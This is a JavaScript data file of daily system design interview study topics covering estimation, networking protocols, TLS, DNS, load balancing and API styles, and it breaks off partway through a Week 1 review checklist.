/**
 * 45-Day Interview Prep OS - System Design Topics Data
 * Comprehensive topics data covering Parts 0 to 13 from the Senior & Staff
 * System Design Interview Guide, structured by Day (1 to 42).
 *
 * Each study day contains 2 to 4 interactive topics/sections.
 * Days 22 to 41 feature paired theoretical architectural concepts while
 * skipping the database question content for the 20 database specs
 * (which are launched in their dedicated full spec modal).
 */

export const SYSTEM_DESIGN_TOPICS_BY_DAY = {
  "1": [
    {
      "id": "0.1",
      "tabTitle": "0.1 Course Guide",
      "title": "0.1 How to Use This Course",
      "section": "Part 0 · The Playbook",
      "whatItIs": "This course is designed for working software engineers preparing for Senior Software Engineer, Staff Engineer, and System Design interviews. Not meant to be read like a novel — every topic is a mini interview lesson structured around the 6-stage loop: Learn → Visualize → Decide → Apply → Defend → Recall.",
      "architecture": "THE 6-STAGE LEARNING LOOP:\nLearn → Visualize (Draw on whiteboard in <60s) → Decide (When to choose / avoid) → Apply (Production systems) → Defend (Tough interviewer follow-ups) → Recall (Explain from memory unprompted)",
      "tradeoffs": [
        "Memorizing architecture templates vs. Mastering the first-principles decision-making process",
        "Passive reading vs. Active 5-pass drill: Understand → Draw → Explain (60s) → Defend → Rebuild"
      ],
      "keyTakeaway": "Learn the components. Understand the trade-offs. Practice the decisions. Defend the architecture."
    },
    {
      "id": "0.2",
      "tabTitle": "0.2 7-Step Skeleton",
      "title": "0.2 The 7-Step Interview Framework",
      "section": "Part 0 · The Playbook",
      "whatItIs": "Most failed senior loops are not failures of knowledge — they are failures of sequencing. The candidate starts drawing boxes at minute three, never states a number, and never names a trade-off. Use a fixed skeleton so your working memory is spent on the problem, not on the process.",
      "architecture": "45-MINUTE TIMELINE BUDGET:\n• 0–5 min: 1. Requirements (Functional, non-functional, explicitly out of scope; say out loud what you are not building)\n• 5–8 min: 2. Scale Math (QPS, storage/yr, bandwidth, read:write ratio; 1 min of arithmetic determines single-node vs. sharded)\n• 8–12 min: 3. API + Data Model (Access patterns determine DB; write the 3 queries the system must serve fast)\n• 12–20 min: 4. High-Level Design (Boxes, arrows, trace one request end to end before adding anything clever)\n• 20–35 min: 5. Deep Dive (The 1–2 hard parts interviewer steers you to, e.g. idempotency & double charging)\n• 35–42 min: 6. Scale + Failure (Bottleneck → fix → new bottleneck; what breaks when node dies, net split, or 10× traffic)\n• 42–45 min: 7. Wrap-Up & Trade-offs (\"I chose X over Y because of Z; if requirement changed to W I would revisit it\")",
      "tradeoffs": [
        "Requirements: Starts designing immediately (Mid-level) vs. Pins down scale, consistency and latency targets first (Senior/Staff)",
        "Technology choice: 'I'd use Kafka and Cassandra' (Mid-level) vs. 'Write-heavy, append-only, low-cardinality queries → Cassandra; if we need ad-hoc joins, this is the wrong call' (Senior/Staff)",
        "Trade-offs: Lists pros and cons generically (Mid-level) vs. Quantifies: '50% storage overhead vs. 200% for 3× replication' (Senior/Staff)",
        "Failure handling: 'Add a replica' (Mid-level) vs. Explains failover, split-brain, replication lag, and read-after-write repair (Senior/Staff)",
        "Ownership: Design only (Mid-level) vs. Mentions rollout, migration, monitoring, on-call blast radius (Senior/Staff)"
      ],
      "keyTakeaway": "\"I chose X over Y because of Z; if the requirement changed to W I would revisit it.\" — This is the sentence that gets you the senior offer rather than the mid-level one. Narrate your uncertainty instead of hiding it: interviewers probe claims; they rarely probe honest boundaries."
    },
    {
      "id": "0.3",
      "tabTitle": "0.3 Estimation Math",
      "title": "0.3 Back-of-the-Envelope Estimation",
      "section": "Part 0 · The Playbook",
      "whatItIs": "Order-of-magnitude arithmetic done on the whiteboard to size a system before designing it. Estimations are important because we need them to understand the scale of the system, justify the design, and answer whether we need a distributed solution, a cache layer, or data replication vs. sharding.",
      "architecture": "THE FOUR NUMBERS TO DERIVE EVERY TIME (WORKSHEET):\n# 1. Traffic: DAU × actions/user/day = requests/day ÷ 86,400 = avg QPS; peak QPS ≈ avg × 2 to 10\n# 2. Storage: writes/day × bytes/write × 365 × retention_years × replication_factor\n# 3. Bandwidth: peak QPS × average payload bytes (split ingress vs egress)\n# 4. Memory (cache): hot set ≈ 20% of daily reads (80/20 rule) × object size\n\nWORKED EXAMPLE — TWITTER-SCALE TIMELINE:\n• Assumptions: 150M DAU, 2 tweets/day, 100 reads/day, 300B/tweet\n• Writes: 300M/day ÷ 86,400 ≈ 3,500 write QPS (Fits in 1 primary DB)\n• Reads: 15B/day ÷ 86,400 ≈ 175,000 read QPS (50:1 read:write ratio → Cache + Fanout-on-write)\n• Storage: 90 GB/day ≈ 33 TB/yr × 3 replicas ≈ 100 TB/yr\n• Conclusion: Writes fit on one beefy node; reads do not. Shard by user_id, cache in Redis.\n\nROUNDING RULES:\n• 1 day ≈ 86,400 s ≈ 10^5 s (1M/day ≈ 10 QPS; 1B/day ≈ 12K QPS)\n• 2^10=KB, 2^20=MB, 2^30=GB, 2^40=TB, 2^50=PB\n• Round to one significant figure and say so.",
      "tradeoffs": [
        "Jumping to sharding vs. Checking data size: Quadtree index takes only 1.71 GB RAM (fits in 1 node); read replicas spread read load cleanly, whereas sharding introduces complex app routing and scatter-gather",
        "Estimate when: Choosing single-node vs distributed, justifying cache/shard/CDN, sizing queue buffers, arguing storage overhead vs erasure coding",
        "Don't over-invest when: Interviewer says 'assume it's huge, skip math', burning >5 min on arithmetic, or when precision changes no architectural decision",
        "Replication limits: Replicas stop working when (a) write throughput saturates, (b) working set exceeds 1 node RAM, or (c) replication lag violates SLAs → dictates sharding"
      ],
      "keyTakeaway": "Numbers before boxes. Five lines of arithmetic tell you whether you need a distributed system at all. The strongest signal you can send is talking yourself out of complexity — \"1.71 GB fits in RAM, so replicas beat shards here\" — because it proves you optimise for operability, not for resume keywords."
    },
    {
      "id": "0.4",
      "tabTitle": "0.4 Latency Constants",
      "title": "0.4 Numbers Every Engineer Should Memorise",
      "section": "Part 0 · The Playbook",
      "whatItIs": "You cannot reason about a design without knowing the cost of each hop. Memorise the order of magnitude, not the digits.",
      "architecture": "LATENCY AT A GLANCE:\n• L1 cache reference: ~1 ns (Free)\n• Main memory reference: ~100 ns (~100× slower than L1 — data locality matters)\n• Compress 1 KB (Snappy): ~2 µs (Compressing before network transfer almost always wins)\n• Send 1 KB over 1 Gbps network: ~10 µs (Bandwidth is rarely the issue; round trips are)\n• SSD random read (4 KB): ~16–100 µs (~1,000× slower than RAM (sec. 5.4, sec. 6.2))\n• Read 1 MB sequentially from memory: ~100 µs (0.1 ms) (Sequential access is king (sec. 7.2))\n• Round trip within a datacenter: ~0.5 ms (Chatty microservices die here: 20 hops = 10 ms floor)\n• Read 1 MB sequentially from SSD: ~1 ms (~10× slower than RAM)\n• Disk seek (HDD): ~10 ms (Why LSM-trees avoid random writes (sec. 4.9))\n• DNS lookup: 20–120 ms (Cache aggressively; pre-resolve (sec. 2.3))\n• Round trip CA → Netherlands: ~150 ms (Why CDNs and edge PoPs exist (sec. 2.5))\n\nQUICK CONVERSIONS:\n• 1 M/day ≈ 12 QPS\n• 1 B/day ≈ 12 K QPS\n• 1 KB × 10 K QPS ≈ 80 MBPS\n\nAVAILABILITY BUDGETS — KNOW THESE BEFORE YOU PROMISE \"FIVE NINES\":\n• 99% (\"two nines\"): 3.65 days/yr | 7.3 hrs/mo | Internal tooling\n• 99.9%: 8.77 hrs/yr | 43.8 min/mo | Standard SaaS SLA\n• 99.99%: 52.6 min/yr | 4.4 min/mo | Payments, core APIs\n• 99.999%: 5.26 min/yr | 26 sec/mo | Telco, exchanges — needs multi-region + automated failover",
      "tradeoffs": [
        "Synchronous cross-region writes vs. Latency SLA (150 ms WAN RTT blows any 200 ms p99 budget; forces async replication)",
        "Serial dependencies multiplication: a service calling five 99.9% dependencies has a theoretical ceiling of 99.9%⁵ ≈ 99.5%. Either reduce synchronous dependencies, or make them optional with fallbacks (sec. 8.2)"
      ],
      "keyTakeaway": "Quote one concrete number per design decision. \"A cross-region round trip is ~150 ms, so synchronous replication would blow our 200 ms p99 budget — I'll replicate asynchronously and accept read-your-writes repair\" is a complete senior-level argument in a single sentence."
    }
  ],
  "2": [
    {
      "id": "1.1",
      "tabTitle": "1.1 Process vs Thread",
      "title": "1.1 Process vs. Thread",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "A program is an executable file that contains a set of instructions and is stored passively on disk. A process is a program in execution. A thread is the smallest unit of execution within a process.",
      "architecture": "ADDRESS-SPACE MODEL:\nProcess A: [Code | Data | Heap] ── Threads T1, T2 share Heap & Code (cheap comms, race risk)\nProcess B: [Code | Data | Heap] ── Process A & B share NOTHING (IPC needed, full fault isolation)",
      "tradeoffs": [
        "Processes (Strong isolation, memory safety boundary, Chrome tabs) vs. Threads (Shared heap, ~1 MB stack, thread pool limits)",
        "Kernel Preemptive Threads vs. User-space Cooperative Coroutines (Goroutines, Kotlin coroutines cost KBs and scale to millions)"
      ],
      "keyTakeaway": "Processes buy isolation; threads buy cheap sharing; coroutines buy concurrency density. Name the property you are buying."
    },
    {
      "id": "1.2",
      "tabTitle": "1.2 VMs vs Containers",
      "title": "1.2 Virtualization vs. Containerization",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "Virtualization is a technology that allows you to create multiple simulated environments or dedicated resources from a single, physical hardware system. Containerization is the packaging together of software code with all its necessary components like libraries, frameworks, and other dependencies so that they are isolated in their own container.",
      "architecture": "ISOLATION MECHANISMS:\n• VMs: Hardware Isolation (Guest OS + Hypervisor) → Minutes start-up, GBs image, 5–15% CPU overhead\n• Containers: Linux kernel namespaces (PID, net, mount) + cgroups (CPU, RAM limits) + overlayfs → Milliseconds start-up, MBs image\n• MicroVMs (AWS Firecracker): Container density with hardware virtualization security boundary (~125 ms boot)",
      "tradeoffs": [
        "Virtual Machines (Hardware boundary, multi-tenant untrusted code) vs. Containers (Shared kernel, high host density, CI/CD speed)",
        "Container escapes (A shared kernel vulnerability compromises the entire host; containers are a configuration boundary, not security)"
      ],
      "keyTakeaway": "Containers abstract the OS; VMs abstract the hardware. Containers buy speed and density; VMs buy hardware-grade isolation. MicroVMs exist because some workloads refuse to compromise on either."
    },
    {
      "id": "1.3",
      "tabTitle": "1.3 Cloud Models",
      "title": "1.3 Cloud Service Models: IaaS, PaaS, SaaS",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "For on-prem applications, you are responsible for the entire stack: hardware, OS, virtualization, runtime, data, and application. With cloud computing, providers take on varying degrees of responsibility: IaaS provides fundamental infrastructure, PaaS provides managed platforms, and SaaS provides complete delivered software.",
      "architecture": "RESPONSIBILITY SPECTRUM:\n• On-Prem: You manage hardware, virtualization, OS, runtime, and app\n• IaaS (EC2, S3, VPC): Vendor owns hardware & hypervisor; you manage OS, middleware, app\n• PaaS (Heroku, App Engine, RDS): Vendor manages OS & runtime; you own code & data\n• SaaS (Gmail, Datadog): Vendor manages everything; you consume via web/API",
      "tradeoffs": [
        "Control vs. Operational Headcount (IaaS gives kernel tuning but requires dedicated SRE team; PaaS speeds time to market)",
        "Proprietary PaaS lock-in vs. Portability (Keep business logic in portable containers, wrap cloud services behind interfaces)"
      ],
      "keyTakeaway": "Anchor choice on three axes: control, operational headcount, and lock-in vs. time-to-market. A senior engineer never says 'PaaS is too expensive' without factoring in the headcount cost of running IaaS."
    }
  ],
  "3": [
    {
      "id": "1.4",
      "tabTitle": "1.4 Serverless Internals",
      "title": "1.4 AWS Lambda Behind the Scenes",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "A serverless event-driven execution runtime that runs code in sandboxed Firecracker microVMs with sub-second provisioning and scale-to-zero billing.",
      "architecture": "INVOCATION PATHWAYS:\n• Sync: Client → Frontend Worker → Worker Manager → Placement Service (Provisions MicroVM) → Init (download S3 bundle) → Invoke\n• Async: Client → ALB → Frontend → Internal SQS Queue → Pollers → Worker MicroVM\n• Cold Start: Sandbox placement + download code + runtime bootstrap + init code (avoid heavy VM runtimes, use Provisioned Concurrency)",
      "tradeoffs": [
        "Serverless (Spiky, unpredictable traffic, event glue, zero idle cost) vs. Containers (Steady high-throughput, predictable p99 latency)",
        "Connection exhaustion (1,000 concurrent Lambdas exhaust DB connections; requires RDS Proxy or PgBouncer)"
      ],
      "keyTakeaway": "Serverless does not remove servers; it moves capacity planning to the vendor. Judge it on traffic shape: bursty favors functions, steady favors containers. Always name the connection exhaustion problem when pairing serverless with relational databases."
    },
    {
      "id": "1.5",
      "tabTitle": "1.5 Scaling Ladder",
      "title": "1.5 Scaling a Website to Millions of Users",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "The canonical 9-stage evolution ladder from a single monolith server to a global distributed microservice platform with database sharding and async message queues.",
      "architecture": "THE 9-STAGE EVOLUTION LADDER:\nStage 1: Single Server (All-in-one)\nStage 2: Separate Web and Database Tiers\nStage 3: Horizontal Scaling with Load Balancer\nStage 4: Database Replication (Read Replicas)\nStage 5: Caching and Content Delivery Network (CDN)\nStage 6: Stateless Architecture (Session in Redis/tokens)\nStage 7: Multiple Data Centers (GeoDNS routing)\nStage 8: Message Queues for Async Processing (Kafka/SQS)\nStage 9: Database Sharding (Horizontal partition)",
      "tradeoffs": [
        "Read Replicas (Cheap read scale, but introduces replication lag breaking read-after-write)",
        "Monolith vs. Microservices (Microservices solve team coordination problems, not performance problems; adds 20 network hops on critical path)"
      ],
      "keyTakeaway": "Scaling is not a ladder you recite — it is: find the bottleneck, remove it, name what breaks next. Replicas scale reads; only sharding scales writes. Never introduce distributed complexity before exhausting simpler primitives."
    },
    {
      "id": "1.6",
      "tabTitle": "1.6 Big Data Cloud",
      "title": "1.6 Choosing a Cloud Vendor for Big Data Solutions",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "Modern big data architectures follow a vendor-neutral 5-stage pipeline pattern: Ingestion → Storage → Processing → Analytical Warehouse → Visualization. Every major cloud provider offers a suite of managed services that map to these pipeline stages.",
      "architecture": "THE 5-STAGE PIPELINE:\n1. Serverless Ingest: AWS Lambda | GCP Cloud Functions | Azure Functions\n2. Streaming Ingest: Kinesis/MSK | Pub/Sub | Event Hubs\n3. Raw Data Lake: S3 | Cloud Storage | Azure Blob (ADLS)\n4. Batch/Stream Processing: EMR/Glue | Dataproc/Dataflow | Synapse/HDInsight\n5. OLAP Warehouse: Redshift | BigQuery | Synapse",
      "tradeoffs": [
        "Data Warehouse (Known schema, BI reporting, fast joins) vs. Data Lakehouse (Delta/Iceberg on object storage, raw schema-on-read, ML)",
        "Batch (Cheap, hourly tolerance, simple replay) vs. Streaming (Sub-second fraud/alerting, requires watermarking and stateful windowing)"
      ],
      "keyTakeaway": "Big data architectures are vendor-neutral: Ingestion → Lake → Processing → Warehouse → Presentation. Focus on data gravity, query pricing models (serverless vs. provisioned), and schema governance. Never move petabytes across cloud boundaries — compute must travel to the data."
    }
  ],
  "4": [
    {
      "id": "11.1",
      "tabTitle": "11.1 TCP vs UDP",
      "title": "11.1 TCP and UDP Fundamentals",
      "section": "Part 11 · Networking",
      "whatItIs": "TCP provides an ordered, reliable byte stream over an unreliable packet network. UDP provides raw connectionless datagram delivery with minimum latency.",
      "architecture": "TCP MECHANICS & BANDWIDTH-DELAY PRODUCT:\n• 3-Way Handshake: SYN → SYN-ACK → ACK + request (1 RTT before any data)\n• Slow Start: cwnd doubles every RTT (14KB → 28KB → 56KB → 113KB)\n• Bandwidth-Delay Product: Max Throughput = Window Size / RTT. On 100ms RTT link, 64KB window caps transfer at ~5 Mbps regardless of 10 Gbps line!",
      "tradeoffs": [
        "TCP (Order, retransmission, congestion control, HTTP/2) vs. UDP (0-RTT, loss-tolerant, audio/video streaming, DNS, QUIC)",
        "Packet Loss Impact (1% loss at 100ms RTT collapses TCP throughput via cubic backoff; BBR congestion control measures bottleneck bandwidth instead)"
      ],
      "keyTakeaway": "Latency, not bandwidth, is the constraint. Throughput is window / RTT. Terminating connections close to the user shortens the round-trip loop."
    },
    {
      "id": "2.1",
      "tabTitle": "2.1 HTTP Generations",
      "title": "2.1 HTTP 1.0 → 1.1 → 2 → 3 (QUIC)",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The generational evolution of the web's communication protocol, systematically removing head-of-line (HOL) blocking at different layers.",
      "architecture": "GENERATIONAL COMPARISON:\n• HTTP/1.0 (1996): 1 request per TCP connection (High handshake overhead)\n• HTTP/1.1 (1997): Keep-alive persistent connections, but sequential pipeline (Application HOL blocking)\n• HTTP/2 (2015): Binary framing, multiplexed streams over 1 TCP connection (Transport HOL remains if 1 packet drops)\n• HTTP/3 (2022): QUIC over UDP; independent streams (Transport HOL solved; 0-RTT resumption; connection migration)",
      "tradeoffs": [
        "HTTP/2 Multiplexing Trap (On lossy mobile networks, 1 lost packet stalls all multiplexed streams; HTTP/3 solves this via UDP)",
        "Domain sharding & concatenation (Antipatterns under HTTP/2 & 3; split multiplexed benefits and defeat fine-grained caching)"
      ],
      "keyTakeaway": "Each HTTP generation removed one blocking layer: 1.1 removed per-request handshakes, 2.0 removed app HOL, 3.0 removed transport HOL."
    },
    {
      "id": "2.2-https",
      "tabTitle": "2.2 How HTTPS Works",
      "title": "2.2 How HTTPS Works",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Hypertext Transfer Protocol Secure (HTTPS) transmits encrypted binary ciphertext using Transport Layer Security (TLS). Asymmetric cryptography establishes trust and derives ephemeral session keys; hardware-accelerated symmetric cryptography (AES-GCM) encrypts all subsequent application data.",
      "architecture": "TLS 1.3 1-RTT HANDSHAKE:\nClient ──TCP SYN──► Server ──TCP SYN-ACK──► Client ──ACK (1 RTT)──►\nClient ──ClientHello (cipher suites, key_share)──► Server\nServer ◄──ServerHello (chosen suite, key_share) + Cert (1 RTT)── Client\nClient validates Cert (Root CA, SAN, OCSP) → ECDHE derives session key → AES-GCM encrypted data!",
      "tradeoffs": [
        "Asymmetric vs. Symmetric (Asymmetric used strictly for initial key derivation; symmetric AES-NI handles bulk transfer at gigabits/sec)",
        "Forward Secrecy: TLS 1.3 removed RSA key transport because stealing server private key later decrypts recorded traffic; modern TLS enforces ECDHE where past sessions remain secure"
      ],
      "keyTakeaway": "Asymmetric crypto establishes trust and a key; symmetric crypto does the work. If you remember only one line, make it that — and add that TLS 1.3 uses ECDHE for forward secrecy in 1 RTT."
    },
    {
      "id": "2.2",
      "tabTitle": "2.2 Forward vs Reverse Proxy",
      "title": "2.2 Forward Proxy vs. Reverse Proxy",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "A forward proxy acts on behalf of clients to access external resources, hiding client identity. A reverse proxy sits in front of backend web servers to intercept incoming requests, hiding internal infrastructure and providing load balancing, TLS termination, and security buffering.",
      "architecture": "FORWARD PROXY: [Clients] ──► [Forward Proxy] ──► (Internet) ──► [Origin Server]\nREVERSE PROXY: [Clients] ──► (Internet) ──► [Reverse Proxy] ──► [Backend App Pool]\nMnemonic: A forward proxy hides the client from the server; a reverse proxy hides the server from the client.",
      "tradeoffs": [
        "Forward Proxy (Client privacy/Tor, corporate DLP, outbound content filtering, egress caching) vs. Reverse Proxy (Ingress load balancing, TLS offload, WAF/DDoS defense, edge caching)",
        "TLS Termination (Decrypts at edge, enables header inspection & L7 routing) vs. TLS Pass-Through (End-to-end zero trust encryption, but loses header inspection and caching)"
      ],
      "keyTakeaway": "A forward proxy acts for the client; a reverse proxy acts for the server. In system design interviews, reverse proxies are ingress workhorses: place them at the perimeter for TLS offload, load distribution, and security buffering before traffic touches application code."
    }
  ],
  "5": [
    {
      "id": "2.3",
      "tabTitle": "2.3 DNS Lookup",
      "title": "2.3 Domain Name System (DNS)",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The hierarchical, distributed phonebook of the Internet. Translates human-readable domain names into machine-routable IP addresses across 4 resolution tiers: Recursive Resolver, Root Nameserver, TLD Nameserver, and Authoritative Nameserver.",
      "architecture": "DNS RESOLUTION HIERARCHY:\nClient ──(1)──► Recursive Resolver (8.8.8.8) ──(2)──► Root Nameserver (.) ──► TLD NS (.com) ──(3)──► Authoritative NS (ns1.awsdns.com) ──(4)──► IP 198.51.100.1 (TTL 300s)\nRouting policies: Latency-Based, Geolocation (GeoDNS), Weighted Round-Robin, Failover.",
      "tradeoffs": [
        "High TTL (Sub-millisecond cached responses, minimal nameserver queries) vs. Low TTL (Agile traffic routing and fast failover, high query volume)",
        "The TTL Disrespect Problem (Intermediate resolvers and client runtimes enforce minimum TTL floors, making DNS alone inadequate for sub-minute RTO)"
      ],
      "keyTakeaway": "DNS is a hierarchical, distributed, aggressively cached lookup system and global routing engine. It is not an instant failover mechanism due to TTL disrespect across intermediate caches. For sub-second failover, use BGP Anycast and Layer 4 load balancers below DNS."
    },
    {
      "id": "2.4",
      "tabTitle": "2.4 URL Lifecycle",
      "title": "2.4 What Happens When You Type a URL in a Browser?",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The complete browser request lifecycle from keystroke to pixels: URL parsing → DNS resolution → TCP 3-way handshake → TLS 1.3 negotiation → HTTP/2 request → TTFB server execution → HTML streaming → Critical Rendering Path (DOM + CSSOM = Render Tree → Layout → Paint).",
      "architecture": "END-TO-END SEQUENCE:\n[ URL Input ] ──► [ DNS (20-120ms) ] ──► [ TCP SYN (1 RTT) ] ──► [ TLS 1.3 (1 RTT) ] ──► [ HTTP Request ] ──► [ Reverse Proxy / App / DB ] ──► [ 200 OK Response ] ──► [ HTML Parser → DOM ] + [ CSS Parser → CSSOM ] ──► [ Render Tree ] ──► [ Layout (Reflow) ] ──► [ Paint & GPU Composite ]",
      "tradeoffs": [
        "Cold Visit Latency (Dominated by sequential round-trips: DNS + TCP + TLS before first byte arrives; mitigate via preconnect/preload)",
        "Blocking Resources (CSS blocks rendering to prevent FOUC; synchronous JS blocks HTML parsing unless deferred/async)"
      ],
      "keyTakeaway": "Tell the story as: parse → resolve → connect → secure → request → serve → render. Every arrow is a network round-trip, a failure boundary, and an edge caching opportunity."
    },
    {
      "id": "2.5",
      "tabTitle": "2.5 Status Codes",
      "title": "2.5 HTTP Status Codes: 200 vs 201, 301 vs 302, 401 vs 403, 502 vs 503 vs 504",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Standardized 3-digit status codes indicating request outcomes. Precision with status codes governs how reverse proxies cache, how clients retry, and how distributed telemetry alerts fire.",
      "architecture": "STATUS CLASSES & CRITICAL PAIRINGS:\n• 1xx: 100 Continue, 101 Switching Protocols, 103 Early Hints\n• 2xx: 200 OK, 201 Created (with Location), 202 Accepted (async job), 204 No Content (DELETE)\n• 3xx: 301/308 (Permanent) vs 302/307 (Temporary; 307/308 preserve HTTP method strictly)\n• 4xx: 401 Unauthorized (AuthN identity failure) vs 403 Forbidden (AuthZ permission failure), 409 Conflict, 429 Rate Limit\n• 5xx: 500 Internal, 502 Bad Gateway (Upstream crashed), 503 Unavailable (Overload), 504 Gateway Timeout (Upstream read timeout)",
      "tradeoffs": [
        "The '200 OK with Error Body' Antipattern (Breaks CDN/proxy caching, confuses API gateways, blinds SLO telemetry dashboards)",
        "Async API Design (Return 202 Accepted with polling job URI instead of holding open long synchronous connections)"
      ],
      "keyTakeaway": "Never return 200 OK for errors. Use 201 for sync creates, 202 for async jobs, 401 for who you are, 403 for what you can do, 502 for upstream crashes, and 504 for upstream timeouts."
    },
    {
      "id": "2.9",
      "tabTitle": "2.9 Browser Internals",
      "title": "2.9 How Modern Browsers Work",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Modern browsers are multi-process operating systems featuring isolated renderer processes per site, GPU compositing, and a strict critical rendering path.",
      "architecture": "CRITICAL RENDERING PATH:\nHTML → Tokenize → DOM Tree ┐\nCSS → CSSOM Tree ─────────┴─► Render Tree → Layout (Geometry) → Paint (Pixels) → Composite (GPU layers)\nSynchronous <script> blocks HTML parsing; CSS blocks rendering. Animating transform/opacity runs on GPU compositor thread without triggering layout.",
      "tradeoffs": [
        "Process-per-site (Strict site isolation prevents Spectre cross-origin memory leaks, at the cost of duplicate RAM overhead) vs. Process-per-tab",
        "Layout vs. Paint vs. Composite (Layout recalculates geometry on main thread; GPU compositing assembles texture layers off-thread)"
      ],
      "keyTakeaway": "A browser is a distributed system on one machine: isolated processes for security, a multi-stage pipeline for rendering."
    }
  ],
  "6": [
    {
      "id": "2.6",
      "tabTitle": "2.6 API Styles",
      "title": "2.6 REST vs. GraphQL vs. gRPC vs. WebSockets",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The four dominant API communication paradigms in modern distributed systems, balancing contract strictness, CPU serialization overhead, edge cacheability, and network duplexity.",
      "architecture": "PARADIGM MATRIX:\n• REST: Resource-oriented, HTTP methods, JSON, stateless, native CDN edge caching\n• GraphQL: Single POST endpoint, client-specified query tree, solves over/under-fetching, N+1 query vulnerability\n• gRPC: Binary Protocol Buffers over HTTP/2, compiled type-safe stubs, high-throughput microservice RPC\n• WebSockets: Full-duplex bidirectional persistent TCP socket via HTTP 101 upgrade, 2-10 byte frame overhead",
      "tradeoffs": [
        "Public APIs (REST for caching and universal client simplicity) vs. Internal Microservices (gRPC for compact binary serialization and low CPU)",
        "BFF Pattern (Backend-for-Frontend with GraphQL/REST at perimeter translating to internal gRPC calls)"
      ],
      "keyTakeaway": "Use REST for public cacheable endpoints, gRPC for internal microservice communication, GraphQL for heterogeneous client UI aggregation, and WebSockets for real-time bidirectional push."
    },
    {
      "id": "2.7",
      "tabTitle": "2.7 Real-Time Protocols",
      "title": "2.7 Short Polling vs. Long Polling vs. WebSockets vs. SSE",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Four competing architectures for delivering asynchronous real-time server updates to clients: Short Polling, Long Polling (Comet), Server-Sent Events (SSE), and WebSockets.",
      "architecture": "STREAMING ARCHITECTURES:\n• Short Polling: Periodic HTTP GET requests on timer; high header overhead and empty response waste\n• Long Polling: Server holds connection open until event occurs; immediate client re-connection loop\n• Server-Sent Events (SSE): Persistent unidirectional HTTP stream (`text/event-stream`); built-in auto-reconnect, native HTTP/2 multiplexing\n• WebSockets: Full-duplex bidirectional TCP socket; minimal framing overhead; requires distributed message bus (Redis Pub/Sub) to scale horizontally",
      "tradeoffs": [
        "SSE vs WebSockets (SSE is simpler, firewall-friendly, and multiplexed over HTTP/2; WebSockets required only for bidirectional low-latency data)",
        "The HTTP/1.1 6-Connection Trap (SSE over HTTP/1.1 exhausts browser connection pool across 6 tabs; HTTP/2 is mandatory in production)"
      ],
      "keyTakeaway": "Do not choose WebSockets by default. For unidirectional server-to-client streaming (notifications, live metrics, LLM tokens), SSE over HTTP/2 is simpler and more resilient. Reserve WebSockets for true bidirectional full-duplex communication."
    },
    {
      "id": "2.8",
      "tabTitle": "2.8 L4 vs L7 LB",
      "title": "2.8 Load Balancing: L4 vs. L7",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Traffic dispatch tier distributing client connections across backend server pools to prevent server saturation and guarantee high availability.",
      "architecture": "LAYERED INGRESS TOPOLOGY:\nClients ──► DNS GeoRouting ──► Anycast IP ──► Layer 4 LB (NLB/IPVS, TCP/IP passthrough, stateless, millions QPS)\n                                                  │\n                                                  ▼\n                                              Layer 7 LB / Gateway (ALB/Envoy, TLS termination, path routing, rate limits)\n                                                  │\n                                      ┌───────────┴───────────┐\n                                      ▼                       ▼\n                                  Service A Pool          Service B Pool",
      "tradeoffs": [
        "Layer 4 (Transport, high throughput, protocol-agnostic, no request inspection) vs. Layer 7 (Application, TLS offload, URL path routing, header cookies)",
        "Balancing Algorithms (Round robin vs. Least connections vs. Consistent hashing for cache affinity vs. Power of two choices)",
        "Sticky Sessions (Antipattern: breaks even load distribution and complicates rolling deploys; prefer stateless servers + Redis session store)"
      ],
      "keyTakeaway": "L4 for speed and protocol-agnostic failover; L7 for routing requiring request inspection. Always use health check floors to prevent cascading failovers."
    },
    {
      "id": "11.2",
      "tabTitle": "11.2 API Gateways",
      "title": "11.2 API Gateways, Reverse Proxies and Service Discovery",
      "section": "Part 11 · Networking",
      "whatItIs": "The front door of a service-oriented architecture, applying authentication, rate limiting, and request transformation before dispatching to dynamically discovered instances.",
      "architecture": "CONCERN SEPARATION:\n• Reverse Proxy: Front for backends (TLS termination, compression, HTTP caching)\n• Load Balancer: Distributes connections across instances by health\n• API Gateway: Understands your API (authN validation, per-tenant quotas, canary routing, request aggregation)\n• Service Discovery: Client-side (queries Eureka registry) vs. Server-side (AWS ALB / Kubernetes DNS)",
      "tradeoffs": [
        "Authentication at Gateway vs. Authorization in Service (Validate token once at edge; enforce resource permissions inside service)",
        "Gateway Anti-patterns (Never put business logic in the gateway; avoid creating a monolithic shared deploy queue)"
      ],
      "keyTakeaway": "The gateway answers: 'Who are you and may you make this call at this rate?' The service answers: 'May you do this to THIS object?'"
    }
  ],
  "7": [
    {
      "id": "rev-1",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 1 · Estimation, Protocols & Ingress",
      "section": "Week 1 Review & Active Recall",
      "whatItIs": "Consolidation and active recall drills on Week 1 fundamentals: back-of-the-envelope calculations, network protocol layers, and ingress topologies.",
      "architecture": "WEEK 1 RAPID AUDIT:\n✓ 7-Step Interview skeleton timing\n✓ Latency hierarchy: RAM (100ns) vs SSD (100µs) vs WAN (150ms)\n✓ TCP slow start and Bandwidth-Delay Product math\n✓ HTTP/1.1 vs HTTP/2 vs HTTP/3 QUIC HOL blocking\n✓ DNS resolution layers and record types (A, CNAME, NS)\n✓ L4 vs L7 load balancer layered architecture",
      "tradeoffs": [
        "Whiteboard Drill: Sizing bandwidth and memory for a 10M DAU service in under 3 minutes",
        "Architecture Drill: Tracing a packet through DNS Anycast, L4 NLB, L7 Envoy, and reverse proxy"
      ],
      "keyTakeaway": "Never enter a design loop without pinning down scale numbers. 5 lines of estimation justify every architectural box you draw."
    },
    {
      "id": "rev-1-checklist",
      "tabTitle": "Week 1 Checklist",
      "title": "Week 1 Core Mastery Checklist",
